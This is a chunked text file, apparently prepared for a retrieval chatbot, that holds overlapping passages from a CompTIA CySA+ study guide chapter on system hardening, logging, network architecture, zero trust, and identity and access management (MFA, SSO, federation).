baked into the service and software development life cycle as well as the system maintenance and management process. Many different containerization services are offered through cloud service providers, and many organizations manage their own Kubernetes or Docker infrastructure. You can read more about Docker here: www.docker.com Microsoft provides a useful overview of containerization technology in general here: https://azure.microsoft.com/en-­us/resources/cloud-­computing-­dictionary/ what-­is-­a-­container Exam Note The CySA+ exam objectives call out specific infrastructure concepts, including serverless, virtualization, and containerization. Know the pros and cons of each and where each concept may be best implemented. Operating System Concepts 41 Operating System Concepts With underlying system and infrastructure in place, the next layer to consider is the operating system (OS). Securing operating systems requires an understanding of the filesystem, configuration management, and system hardening, as well as how the OS itself works. System Hardening Security practitioners need to understand how to secure a system by reducing its attack surface. That means reducing the potential ways that an attacker could compromise or otherwise influence a system while retaining the functionality that is required of the system. Hardening techniques and processes exist for all of the technologies in place in modern organizations, including software, hardware, networks, and services. Here, we’ll focus on system hardening concepts. System hardening typically relies on a number of common practices: ■■ Updating and patching the system
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	configuration management, and system hardening, as well as how the OS itself works. System Hardening Security practitioners need to understand how to secure a system by reducing its attack surface. That means reducing the potential ways that an attacker could compromise or otherwise influence a system while retaining the functionality that is required of the system. Hardening techniques and processes exist for all of the technologies in place in modern organizations, including software, hardware, networks, and services. Here, we’ll focus on system hardening concepts. System hardening typically relies on a number of common practices: ■■ Updating and patching the system ■■ Removing unnecessary software and services ■■ Restricting and logging administrative access ■■ Controlling the creation of new accounts ■■ Enabling logging and using appropriate monitoring ■■ Using capabilities like disk encryption and secure boot Organizations frequently use industry best practice–driven benchmarks as the basis for their system hardening activities. The Center for Internet Security (CIS) provides a range of hardening guides and configuration benchmarks for common operating systems. You can find the Windows 11 desktop benchmark at: www.cisecurity.org/benchmark/microsoft_windows_desktop and other benchmarks such as various Linux distros, macOS, iOS, and commonly used software and services at: www.cisecurity.org/benchmark While organizations often base their system hardening practices on standards like the CIS benchmark, they also need to ensure that the settings and changes included in the benchmark do not interfere with their operations. That means that adopting a benchmark requires thought and analysis as well as testing in real-­world environments to ensure that critical functionality isn’t impacted. It also means that organizations that need to change the benchmark should consider why their tools, services, or configurations need to be different and if that creates additional risk to their operations or systems. 42 Chapter 2 ■ System and Network Architecture If you’re not familiar with system hardening techniques, it’s worth taking the time to download a Windows benchmark and a Linux benchmark from CIS to read through them. They’ll help you understand what a benchmark is, what it contains, and the types of decisions that organizations need to make when adopting benchmarks for their own use. The Windows Registry The Windows Registry is a database that contains operating system settings. Programs, services, drivers, and the operating system itself all rely on information stored in the Registry, making it both a critical resource and a frequent target for malicious activity because it is very useful for persistence. Figure 2.1 shows regedit, the built-­in Windows Registry editing tool viewing Registry information about Windows Defender. Entries in the Registry typically have a name, type, and data value that you can set. FIGURE 2.1 Using regedit to view the Windows Registry The Windows Registry has five main root keys, as Table 2.1 shows. Operating System Concepts TA B L E 2 . 1 43 Five main root keys Root key Description HKEY_CLASSES_ROOT (HKCR) COM object registration information. Associates files type with programs HKEY_LOCAL_MACHINE (HKLM) System information, including scheduled tasks and services HKEY_USERS (HKU) Information about user accounts
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	useful for persistence. Figure 2.1 shows regedit, the built-­in Windows Registry editing tool viewing Registry information about Windows Defender. Entries in the Registry typically have a name, type, and data value that you can set. FIGURE 2.1 Using regedit to view the Windows Registry The Windows Registry has five main root keys, as Table 2.1 shows. Operating System Concepts TA B L E 2 . 1 43 Five main root keys Root key Description HKEY_CLASSES_ROOT (HKCR) COM object registration information. Associates files type with programs HKEY_LOCAL_MACHINE (HKLM) System information, including scheduled tasks and services HKEY_USERS (HKU) Information about user accounts HKEY_CURRENT_USER (HKCU) Information about the currently logged-­in user HKEY_CURRENT_CONFIG (HKCC) Current local hardware profile information storage Each root key has Registry hives, which are groups of keys and values that are connected with the root keys. Each key can have values, including strings, binary data, numeric data, links to other Registry keys, or Windows-­specific component data. Registry keys themselves can be secured using Windows-­native access controls, allowing or denying access and providing audit information as configured. If you’d like to learn how to defend the Windows Registry, you can read more at https://securityboulevard.com/2022/10/ the-­defenders-­guide-­to-­the-­windows-­registry. File Structure and File Locations While you won’t be expected to have memorized Linux and Windows filesystem structures for the exam, you should have a basic understanding of how both operating systems tend to structure file locations. You’ll also want to know where they most commonly store critical files, as both file structure and configuration file locations are part of the Exam Objectives. The CySA+ exam objectives include configuration file locations as a key item. While configuration file locations may vary, there are commonly used locations for each major operating system. Protecting configuration information can be challenging and complicated, but best practices like encrypting configuration information and using endpoint security tools can make a big difference. You can read more about how configuration files can be protected in Linux at https://itnext.io/ linux-­protecting-­configuration-­files-­7b0e53b49a4. 44 Chapter 2 ■ System and Network Architecture Windows configuration information is often stored in the Windows Registry, although additional configuration information may be stored in the C:\ProgramData\ or C:\ Program Files\ directories as well as in the user’s AppData directory. Linux configuration information is commonly stored in the /etc/ directory, although additional configuration information may be stored in other locations depending on the service or program. macOS often stores information in ~/Library/Preferences and /Library/ Preferences. Exam Note Since the exam objectives specifically mention configuration file locations as a topic, you should make sure you know where Windows and Linux commonly have configuration files. The exam typically does not focus on macOS. System Processes System processes are the core processes for an operating system. Although system processes vary from operating system to operating system, they tend to share similar functions. In Windows, the core system process is the NT kernel, which is found in C:\Windows\ System32\notskrnl.exe and always has a process ID of 4. Other processes include the Registry process, memory compression, session manager
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	/Library/ Preferences. Exam Note Since the exam objectives specifically mention configuration file locations as a topic, you should make sure you know where Windows and Linux commonly have configuration files. The exam typically does not focus on macOS. System Processes System processes are the core processes for an operating system. Although system processes vary from operating system to operating system, they tend to share similar functions. In Windows, the core system process is the NT kernel, which is found in C:\Windows\ System32\notskrnl.exe and always has a process ID of 4. Other processes include the Registry process, memory compression, session manager subsystem (smss.exe), Windows subsystem process (crss.exe), services control manager (services.exe), Windows logon process (winlogon.exe), and the Windows initialization process (wininit.exe), among others. Fortunately, you don’t need to know every Windows system process for the exam. Instead, you’ll want to focus on understanding the basic concept of system processes: they’re critical parts of the operating system, attackers often name processes to look similar to legitimate processes to help conceal malicious software, and attackers also target them to try to gain privileged access to the operating system. You can find a list of system processes, locations, and other related details at https://nasbench.medium.com/ windows-­system-­processes-­an-­overview-­for-­blue-­ teams-­42fa7a617920. Logging, Logs, and Log Ingestion 45 Hardware Architecture The underlying hardware architecture of the systems that operating systems and software run on can have an impact on security operations in a number of ways. One of the most common impacts is that malicious software may not run on some hardware. While most computers now run on x86 instruction set CPUs from AMD and Intel, there are an increasing number of computers and other devices that use Advanced RISC Machine (ARM) or other CPUs that do not implement the x86 instruction set. That means that software that is not compiled and intended for other architectures is unlikely to work with them. A recent example of a non-­x86, ARM-­based architecture in increasingly broad usage is Apple’s M1 and M2 series chips. Although they are able to emulate x86, it isn’t the native architecture of the CPUs. Exam Note Operating system concepts for this section that you’ll need to know for the exam include the basics of the Windows Registry, what system hardening is and how it’s accomplished, common configuration file locations, what system processes are, and why hardware architecture plays a role in system security. It’s worth noting that simply using an alternate hardware architecture isn’t a guarantee of safety. Attackers increasingly build malicious software to attack multiple hardware architectures. Despite this, knowing what hardware architecture systems that you are responsible for and what that may mean as a defender and for attackers can help you manage your organization’s security posture. Logging, Logs, and Log Ingestion Logging can be a complex task. The CySA+ exam objectives focus on two things that you’ll need to be aware of: time synchronization and logging levels. Time Synchronization Time synchronization between systems and services is critical to log analysis. Events and incidents often result
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	using an alternate hardware architecture isn’t a guarantee of safety. Attackers increasingly build malicious software to attack multiple hardware architectures. Despite this, knowing what hardware architecture systems that you are responsible for and what that may mean as a defender and for attackers can help you manage your organization’s security posture. Logging, Logs, and Log Ingestion Logging can be a complex task. The CySA+ exam objectives focus on two things that you’ll need to be aware of: time synchronization and logging levels. Time Synchronization Time synchronization between systems and services is critical to log analysis. Events and incidents often result in logs in multiple locations or from multiple servers or services needing to be correlated. If time is not properly and accurately synchronized, events will not appear in the correct order or at the right times. This can lead to inaccurate assessments or misleading scenarios. Chapter 2 46 ■ System and Network Architecture Fortunately, the Network Time Protocol (NTP) as well as NTP servers allow for easy time synchronization. That means that an important step for system administrators and security practitioners is to ensure that time synchronization is happening and that it is correct as part of regular reviews of systems and services before an event or issue occurs. You can read more about Windows network time services and settings at: https://learn.microsoft.com/en-­us/windows-­server/networking/ windows-­time-­service/windows-­time-­service-­tools-­and-­settings A largely distribution-­agnostic NTP guide for Linux can be found at: https://timetoolsltd.com/ntp/how-­to-­install-­and-­configure-­ntp-­on-­linux Logging Levels Network device log files often have a log level associated with them. Although log level definitions vary, many are similar to Cisco’s log levels, which are shown in Table 2.2. TA B L E 2 . 2 Cisco log levels Level Level name Example 0 Emergencies Device shutdown due to failure 1 Alerts Temperature limit exceeded 2 Critical Software failure 3 Errors Interface down message 4 Warning Configuration change 5 Notifications Line protocol up/down 6 Information ACL violation 7 Debugging Debugging messages Security practitioners need to understand log levels and what setting a log level can mean for data capture. If your organization sets a logging level that doesn’t capture the data you need, you can miss important information. If you set an overly detailed log level, like log level 7, it can provide an overwhelming flood of detail that isn’t useful in most circumstances. Network Architecture 47 General Logging Considerations While the CySA+ exam objectives don’t specifically mention these, you’ll want to keep a few general best practices for logging infrastructure in mind: ■■ ■■ ■■ ■■ ■■ ■■ ■■ Logs should contain enough information to be useful and should be able to be interpreted in useful ways, and so must contain both meaning and context. Logs should be protected so they cannot be changed. Logs should be sent to a central location where they can be stored, analyzed, and reported on. Logs should be validated to ensure that they contain the information that would be needed in the event of an issue or incident. Logs should be checked as part of
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	keep a few general best practices for logging infrastructure in mind: ■■ ■■ ■■ ■■ ■■ ■■ ■■ Logs should contain enough information to be useful and should be able to be interpreted in useful ways, and so must contain both meaning and context. Logs should be protected so they cannot be changed. Logs should be sent to a central location where they can be stored, analyzed, and reported on. Logs should be validated to ensure that they contain the information that would be needed in the event of an issue or incident. Logs should be checked as part of normal system monitoring to ensure that systems that should send logs are doing so. Unnecessary log information should be avoided to conserve space and resources. Log retention policies and practices should be implemented as appropriate for the organization and systems. Network Architecture Understanding how your network is designed, what devices exist on it and what their purposes and capabilities are, and what controls you can apply using the devices is critical to securing a network. Traditional physical networks, software-­defined networks, hybrid, cloud, and virtual networks all exist in parallel in many organizations, and you will need to understand how each of these technologies can impact the architecture and security posture of your organization. On-­Premises On-­premises network architecture is composed of the routers, switches, security devices, cabling, and all the other network components that make up a traditional network. You can leverage a wide range of security solutions on a physical network, but common elements of a security design include the following: ■■ ■■ ■■ Firewalls that control traffic flow between networks or systems Intrusion prevention systems (IPSs), which can detect and stop attacks, and intrusion detection systems (IDSs), which only alarm or notify when attacks are detected Content filtering and caching devices that are used to control what information passes through to protected devices Chapter 2 48 ■■ ■■ ■■ ■ System and Network Architecture Network access control (NAC) technology that controls which devices are able to connect to the network and which may assess the security state of devices or require other information before allowing a connection Network scanners that can identify systems and gather information about them, including the services they are running, patch levels, and other details about the systems Unified threat management (UTM) devices that combine a number of these services, often including firewalls, IDSs/IPSs, content filtering, and other security features As you prepare for the CySA+ exam, familiarize yourself with these common devices and their basic functions so that you can apply them in a network security design. Cloud The shift to use of cloud services throughout organizations has not only shifted the perimeter and driven the need for zero trust environments, but has also created a need for organizations to update their security practices for a more porous, more diverse operating environment. Unlike on-­premises systems, the underlying environment provided by cloud service providers is not typically accessible to security practitioners to configure, test, or
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	filtering, and other security features As you prepare for the CySA+ exam, familiarize yourself with these common devices and their basic functions so that you can apply them in a network security design. Cloud The shift to use of cloud services throughout organizations has not only shifted the perimeter and driven the need for zero trust environments, but has also created a need for organizations to update their security practices for a more porous, more diverse operating environment. Unlike on-­premises systems, the underlying environment provided by cloud service providers is not typically accessible to security practitioners to configure, test, or otherwise control. That means that securing cloud services requires a different approach. With most software as a service (SaaS) and platform as a service (PaaS) vendors, security will primarily be tackled via contractual obligations. Configurations and implementation options can create security challenges, and identity and access management is also important in these environments. Infrastructure as a service (IaaS) vendors like AWS, Azure, Google, and others provide more access to infrastructure, and thus some of the traditional security concerns around operating system configuration, management, and patching will apply. Similarly, services and applications need to be installed, configured, and maintained in a secure manner. Cloud providers often provide additional security-­oriented services that may be useful in their environment and which may replace or supplement the tools that you might use on-­premises. Assessing the Cloud Although control of SaaS and PaaS solutions lies with the vendor, you can take some additional action to help ensure your organization’s security. Many cloud vendors offer access to third-­party security audit information like an SSAE-­16 Type 1 or Type 2 report. In addition, you may want to conduct a security assessment to determine whether the vendor meets your own expected security best practices. Tools like the shared risk assessment tools provided by Shared Assessments (www.sharedassessments.org) can help you conduct an assessment before engaging with a cloud or outsourced IT vendor. While you’re at it, you should also ensure that the contract covers any legal or regulatory issues that would impact your outsourced solution. Network Architecture 49 Many cloud vendors will provide audit and assessment results upon request, often with a required nondisclosure agreement before they will provide the information. When considering on-­premises versus cloud security, you should review what options exist in each environment and what threats are relevant and which are different, if any. Assessing the security capabilities, posture, threats, and risks that apply to or are specific to your cloud service provider is also an important task. Virtual private cloud (VPC) is an option delivered by cloud service providers that builds an on-­demand semi-­isolated environment. A VPC typically exists on a private subnet and may have additional security to ensure that intersystem communications remain secure. Cloud-­specific security tools and technologies are increasingly common, including things like cloud access security brokers (CASBs). We’ll cover them in more depth later in this chapter when we discuss identity and access management. Hybrid Hybrid network architectures combine on-­premises and
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	security capabilities, posture, threats, and risks that apply to or are specific to your cloud service provider is also an important task. Virtual private cloud (VPC) is an option delivered by cloud service providers that builds an on-­demand semi-­isolated environment. A VPC typically exists on a private subnet and may have additional security to ensure that intersystem communications remain secure. Cloud-­specific security tools and technologies are increasingly common, including things like cloud access security brokers (CASBs). We’ll cover them in more depth later in this chapter when we discuss identity and access management. Hybrid Hybrid network architectures combine on-­premises and cloud infrastructure and systems. This can introduce complexity as each distinct environment must be secured and have a security model that is appropriate to the entire infrastructure. Despite this, hybrid architectures are common as organizations migrate from on-­premises datacenters to cloud services and cloud infrastructure as a service models while retaining some on-­site services and systems. Network Segmentation Providing a layered defense often involves the use of segmentation, or separation. Physical segmentation involves running on separate physical infrastructure or networks. System isolation is handled by ensuring that the infrastructure is separated and can go as far as using an air gap, which ensures that there is no connection at all between the infrastructures. Air gaps may feel like the ultimate in segmentation-­based security, but even a carefully air-­gapped system can be compromised. The Stuxnet malware was introduced to air-­gapped systems in Iran’s nuclear program on a thumb drive carried in by an engineer who didn’t know that the malware had transferred to the drive. The authors of this book have seen consultants and staff bring infected systems and malware into physically protected networks, and we have also seen data extracted from air-­ gapped systems by staff members who wanted to work on the data after hours. An air gap is only as effective as the enforcement and monitoring of what bypasses it! 50 Chapter 2 ■ System and Network Architecture Virtual segmentation takes advantage of virtualization capabilities to separate functions to virtual machines or containers, although some implementations of segmentation for virtualization also run on separate physical servers in addition to running separate virtual machines. Network segmentation or compartmentalization is a common element of network design. It provides a number of advantages: ■■ ■■ ■■ ■■ The number of systems that are exposed to attackers (commonly called the organization’s attack surface) can be reduced by compartmentalizing systems and networks. It can help to limit the scope of regulatory compliance efforts by placing the systems, data, or unit that must be compliant in a more easily maintained environment separate from the rest of the organization. In some cases, segmentation can help increase availability by limiting the impact of an issue or attack. Segmentation is used to increase the efficiency of a network. Larger numbers of systems in a single segment can lead to network congestion, making segmentation attractive as networks increase in size. Network segmentation can be accomplished in many ways,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	surface) can be reduced by compartmentalizing systems and networks. It can help to limit the scope of regulatory compliance efforts by placing the systems, data, or unit that must be compliant in a more easily maintained environment separate from the rest of the organization. In some cases, segmentation can help increase availability by limiting the impact of an issue or attack. Segmentation is used to increase the efficiency of a network. Larger numbers of systems in a single segment can lead to network congestion, making segmentation attractive as networks increase in size. Network segmentation can be accomplished in many ways, but for security reasons, a firewall with a carefully designed ruleset is typically used between network segments with different levels of trust or functional requirements. Network segmentation also frequently relies on routers and switches that support VLAN (virtual local area network) tagging. In some cases where segmentation is desired and more nuanced controls are not necessary, segmentation is handled using only routers or switches. One common solution for access into segmented environments like these is the use of a jump box (sometimes called a jump server), which is a system that resides in a segmented environment and is used to access and manage the devices in the segment where it resides. Jump boxes span two different security zones and should thus be carefully secured, managed, and monitored. The Case for Product Diversity Product diversity (using products from multiple vendors) is sometimes used to create an additional layer of security. The intent of using diverse products is to eliminate a single point of failure by ensuring that a vulnerability or design flaw found in one product does not make an entire network or system vulnerable to exploit. For example, in a network design, this might mean using Juniper border routers, Cisco core routers, and Palo Alto security devices. If a vulnerability existed in the Cisco core routers, the other devices would be less likely to suffer from the same issue, meaning that attackers should not be able to exploit them, thus potentially limiting the impact of an attack. Unfortunately, using multiple products rather than settling on a single vendor or product for a solution entails additional overhead and costs for maintenance, training, and support, Network Architecture 51 potentially resulting in more vulnerabilities! The right choice varies from organization to organization and design to design, but diversity may be a useful design choice if your organization is worried about a single vulnerability affecting your entire network, platform, or other environment. In addition to jump boxes, another common means of providing remote access as well as access into segmented networks from different security zones is through a virtual private network (VPN). Although VPNs do not technically have to provide an encryption layer to protect the traffic they carry, almost all modern implementations will use encryption while providing a secure connection that makes a remote network available to a system or device. Figure 2.2 shows an example of a segmented network with a protected
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	choice if your organization is worried about a single vulnerability affecting your entire network, platform, or other environment. In addition to jump boxes, another common means of providing remote access as well as access into segmented networks from different security zones is through a virtual private network (VPN). Although VPNs do not technically have to provide an encryption layer to protect the traffic they carry, almost all modern implementations will use encryption while providing a secure connection that makes a remote network available to a system or device. Figure 2.2 shows an example of a segmented network with a protected network behind security devices, with a VPN connection to a jump box allowing access to the protected segment. FIGURE 2.2 A simple segmented network Web Application Firewall VPN Device/ Server VPN Internet Firewall pair Jump Box Protected/Private network Software-­Defined Networking Software-­defined networking (SDN) makes networks programmable. Using SDN, you can control networks centrally, which allows management of network resources and traffic with more intelligence than a traditional physical network infrastructure. Software-­defined networks provide information and control via APIs (application programming interfaces) like 52 Chapter 2 ■ System and Network Architecture OpenFlow, which means that network monitoring and management can be done across disparate hardware and software vendors. Since SDN allows control via APIs, API security as well as secure code development practices are both important elements of an SDN implementation. In addition to organizationally controlled SDN implementations, software-­defined network wide area networks (SDN-­WANs) are an SDN-­driven service model where providers use SDN technology to provide network services. They allow blended infrastructures that may combine a variety of technologies behind the scenes to deliver network connectivity to customers. SDN-­WAN implementations often provide encryption but introduce risks, including vulnerabilities of the SDN orchestration platform, risks related to multivendor network paths and control, and of course, availability and integrity risks as traffic flows through multiple paths. Zero Trust One major concept in modern security architecture design is the idea of zero trust. The zero trust concept removes the trust that used to be placed in systems, services, and individuals inside security boundaries. In a zero trust environment, each action requested and allowed must be verified and validated before being allowed to occur. Zero trust moves away from the strong perimeter as the primary security layer and instead moves even further toward a deeply layered security model where individual devices and applications, as well as user accounts, are part of the security design. As perimeters have become increasingly difficult to define, zero trust designs have become more common to address the changing security environment that modern organizations exist in. Implementing zero trust designs requires a blend of technologies, processes, and policies to manage, monitor, assess, and maintain a complex environment. Secure Access Service Edge Secure access service edge (SASE, pronounced “sassy”) is a network architecture design that leverages software-­defined wide area networking (SD-­WAN) and security functionality like cloud access security brokers (CASBs), zero trust, firewalls as a service, antimalware tools, or other capabilities to
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	as user accounts, are part of the security design. As perimeters have become increasingly difficult to define, zero trust designs have become more common to address the changing security environment that modern organizations exist in. Implementing zero trust designs requires a blend of technologies, processes, and policies to manage, monitor, assess, and maintain a complex environment. Secure Access Service Edge Secure access service edge (SASE, pronounced “sassy”) is a network architecture design that leverages software-­defined wide area networking (SD-­WAN) and security functionality like cloud access security brokers (CASBs), zero trust, firewalls as a service, antimalware tools, or other capabilities to secure your network. The concept focuses on ensuring security at the endpoint and network layer, presuming that organizations are decentralized and that datacenter-­focused security models are less useful in current organizations. The CySA+ exam objectives call SASE “secure access secure edge,” but the common industry term is secure access service edge. You may encounter either on the exam, so be aware that this difference in phrasing exists. SASE-­based designs help to address the move to software as a service as the most common model for service delivery for many organizations, and reflect the change to decentralized infrastructure and services. Identity and Access Management 53 Exam Note As you plan for the exam, make sure you can describe various network architectures and what they mean for organizational security. On-­premises, cloud, and hybrid networks each have different requirements and considerations. Network segmentation is used to separate different risk or security levels. Zero trust, SASE, and SDN are all technologies used to help secure networks. Identity and Access Management Identities, or the set of claims made about an individual or account holder that are made about one party to another party (such as a service provider, application, or system), are a key part of authentication, authorization, and accounting. The user accounts we use to log in require the ability to uniquely identify individuals and other subjects such as services to allow permissions, rights, group memberships, and attributes to be associated with them. The attributes associated with an identity include information about a subject and often include their name, address, title, contact information, and other details about the individual. These attributes may be used as part of authentication processes, may be used to populate directory information, or could be collected to help meet other organizational needs or business purposes. Identities are used as part of the authentication, authorization, and accounting (AAA) framework that is used to control access to computers, networks, and services. AAA systems authenticate users by requiring credentials like a username, a password, and possibly a biometric or token-­based authenticator. Once individuals have proven who they are, they are then authorized to access or use resources or systems. Authorization applies policies based on the user’s identity information and rules or settings, allowing the owner of the identity to perform actions or to gain access to systems. The ongoing management of these rights is known as privilege management. The accounting element of the
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	of the authentication, authorization, and accounting (AAA) framework that is used to control access to computers, networks, and services. AAA systems authenticate users by requiring credentials like a username, a password, and possibly a biometric or token-­based authenticator. Once individuals have proven who they are, they are then authorized to access or use resources or systems. Authorization applies policies based on the user’s identity information and rules or settings, allowing the owner of the identity to perform actions or to gain access to systems. The ongoing management of these rights is known as privilege management. The accounting element of the AAA process is the logging and monitoring that goes with the authentication and authorization. Accounting monitors usage and provides information about how and what users are doing. Identity systems provide a number of common functions: identity creation and management, authentication and authorization, and in some cases, federation of identity information to allow use of identities outside of their home organization. The CySA+ exam objectives focus on a handful of specific technologies that you’ll need to be aware of: multifactor authentication, single sign-­on, passwordless, federation, privileged access management, and cloud access security brokers. 54 Chapter 2 ■ System and Network Architecture Multifactor Authentication (MFA) One of the most important security measures put in place to authenticate users is multifactor authentication (MFA). MFA relies on two or more distinct authentication factors like a password, a token or smartcard, a biometric factor, or even the location that the individual is authenticating from. A key part of this is that the factors should be different; two passwords do not make an effective MFA scheme. MFA relies on a few common types of authentication factors or methods: ■■ ■■ Knowledge factors are something you know. Passwords and passphrases are the most common knowledge factors, but authentication systems also sometimes use other data that you may know. Examples include systems that build questions from personal data the organization has about you such as your current mortgage payment, your residence a decade ago, or other things that you will know but that someone else is unlikely to. Possession factors are something you have. The most common examples of this are authenticator applications, security tokens, and smartcards. Figure 2.3 shows an example of the Google Authenticator application, a smartphone-­based onetime password generator tool. Having the application that provides the code is the possession factor when using this type of token. FIGURE 2.3 ■■ ■■ Google authenticator codes Biometric factors are something you are. They include fingerprints, retina scans, voiceprints, and a host of other methods of measuring features of the human body. Location factors, which are less frequently used, rely on physical location, determined either by where a system or network is located, or by using GPS or other data to verify that you are in a place that is trusted or allowed to access a system. Identity and Access Management 55 It’s safe to show a code like this because they constantly change. The account information shown
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	of token. FIGURE 2.3 ■■ ■■ Google authenticator codes Biometric factors are something you are. They include fingerprints, retina scans, voiceprints, and a host of other methods of measuring features of the human body. Location factors, which are less frequently used, rely on physical location, determined either by where a system or network is located, or by using GPS or other data to verify that you are in a place that is trusted or allowed to access a system. Identity and Access Management 55 It’s safe to show a code like this because they constantly change. The account information shown was created just for this book, making it safe to display as well. MFA helps prevent attackers from authenticating using stolen credentials by making it significantly less likely they will have both (or more!) of the factors required to authenticate to a user account. If an attacker manages to phish a password or conducts a successful brute-­force password guessing attack, they probably won’t have access to that individual’s cell phone or token or have access to a biometric factor like their fingerprint. This security advantage means that MFA is increasingly considered a necessary default security control for systems and services that require a greater level of security than a simple password. Major e-­commerce, banking, social networks, and other service providers now have two-­factor authentication (2FA) functionality available, and an increasing number are requiring it by default. That doesn’t mean that MFA is perfect; a lost phone or token, an insecure method of delivering a second factor, or a backup access method that allows users to bypass the second factor by talking to a support person can all result in a failure of a multifactor system. Passwordless Passwordless authentication allows users to log in without a password. In most implementations, this means that users enter a username or user ID, then use a USB token, authenticator application, or other device. Unlike MFA, passwordless authentication processes typically rely on a single factor that is designed to be more secure. Single Sign-­On (SSO) Many web applications rely on single sign-­on (SSO) systems to allow users to authenticate once and then use multiple systems or services without having to use different usernames or passwords. Shared authentication schemes are somewhat similar to single sign-­on and allow an identity to be reused on multiple sites while relying on authentication via a single identity provider. Shared authentication systems require users to enter credentials when authenticating to each site, unlike SSO systems. Exam Note The CySA+ exam objectives mention SSO but don’t list specific technologies. As you prepare for the exam, make sure you understand the general concept of SSO, why your organization might want to use it, and what security issues it can bring with it. 56 Chapter 2 ■ System and Network Architecture Common SSO technologies include the Lightweight Directory Access Protocol (LDAP) and the Central Authentication Service (CAS). Shared authentication technologies include the following: ■■ ■■ ■■ ■■ OpenID, an open source standard for decentralized
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	systems require users to enter credentials when authenticating to each site, unlike SSO systems. Exam Note The CySA+ exam objectives mention SSO but don’t list specific technologies. As you prepare for the exam, make sure you understand the general concept of SSO, why your organization might want to use it, and what security issues it can bring with it. 56 Chapter 2 ■ System and Network Architecture Common SSO technologies include the Lightweight Directory Access Protocol (LDAP) and the Central Authentication Service (CAS). Shared authentication technologies include the following: ■■ ■■ ■■ ■■ OpenID, an open source standard for decentralized authentication. OpenID is broadly used by major websites like Google, Amazon, and Microsoft. Users create credentials with an identity provider like Google; then sites (relying parties) use that identity. OAuth, an open authorization standard. OAuth is used by Google, Microsoft, Facebook, and other sites to allow users to share elements of their identity or account information while authenticating via the original identity provider. OAuth relies on access tokens, which are issued by an authorization server and then presented to resource servers like third-­party web applications by clients. OpenID Connect is an authentication layer built using the OAuth protocol. Facebook Connect, also known as Login with Facebook, is a shared authentication system that relies on Facebook credentials for authentication. One of SSO’s most significant security benefits is the potential to reduce the occurrence of password reuse. This may also reduce the likelihood of credential exposure via third-­party sites when users reuse credential sets. In addition, SSO is popular due to the potential cost savings from fewer password resets and support calls. Shared authentication systems share some of the same benefits, allowing users to use their credentials without having to create new accounts on each site, thus reducing password fatigue. In addition, users are typically informed about the types of data that will be released to the relying party, such as email account, contact information, gender, or other personal information. Shared authentication systems do not necessarily provide a single sign-­on experience. Of course, SSO systems create risks as well—­since SSO makes it easier to access multiple systems and services, it makes it easier for attackers who obtain credentials to access them. SSO may also make it easier for an attacker to exploit additional systems once they control a user’s browser or system, as the user will not be required to log in again. This can be partially countered by requiring reauthentication and the use of two-­factor authentication for critical systems. Although SSO does create dangers, it is the most common solution for most organizations because of the ease of use it creates. Federation The ability to federate identity, which is the process of linking an identity and its related attributes between multiple identity management systems, has become increasingly common. That means that federation is widely used across cloud services and organizations today. You have probably already seen or used a federated identity system if you use your Microsoft, Google, Facebook, or LinkedIn
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	again. This can be partially countered by requiring reauthentication and the use of two-­factor authentication for critical systems. Although SSO does create dangers, it is the most common solution for most organizations because of the ease of use it creates. Federation The ability to federate identity, which is the process of linking an identity and its related attributes between multiple identity management systems, has become increasingly common. That means that federation is widely used across cloud services and organizations today. You have probably already seen or used a federated identity system if you use your Microsoft, Google, Facebook, or LinkedIn accounts to access sites that aren’t hosted by those service providers. Each site allows use of their credentials, as well as a set of attributes by third-­ party sites. Identity and Access Management 57 Exam Note The CySA+ exam objectives specifically call out federation but without any further detail. Make sure you pay attention to what federation is, why you might want to use it, and what security concerns it brings, and know a bit about the common technologies associated with it. Federated Identity Security Considerations Federated identities move trust boundaries outside of your own organization, resulting in new concerns when designing, implementing, or using federated identity. This leads to the need to look at federated security from three points of view: ■■ ■■ ■■ As an identity provider (IDP), members of a federation must provide identities, make assertions about those identities to relying parties, and release information to relying parties about identity holders. The identities and related data must be kept secure. Identities (and sometimes attributes) have to be validated to a level that fits the needs of the federation, and may have user-­level controls applied to their release. In addition, service providers may be responsible for providing incident response coordination for the federation, communication between federation members, or other tasks due to their role in the federation. As the relying party (RP) or service provider (SP), members of a federation must provide services to members of the federation, and should handle the data from both users and identity providers securely. The consumer or user of federated services may be asked to make decisions about attribute release and to provide validation information about their identity claims to the IDP. Each of these roles appears in Figure 2.4, which shows an example of the trust relationships and authentication flow that are required for federated identities to work. Hacking from Inside a Federation Federated identities can be very useful, but federations are only as strong as their weakest member’s security. In the past, one of the authors of this book was involved in the incident response process between members of a large-­scale federation. A successful hacker used compromised credentials to log into systems at various federation member sites. There, he used the credentials to access systems used for research efforts. Although the credentials he had were not administrative credentials, they did have local system access, allowing the attacker to identify and
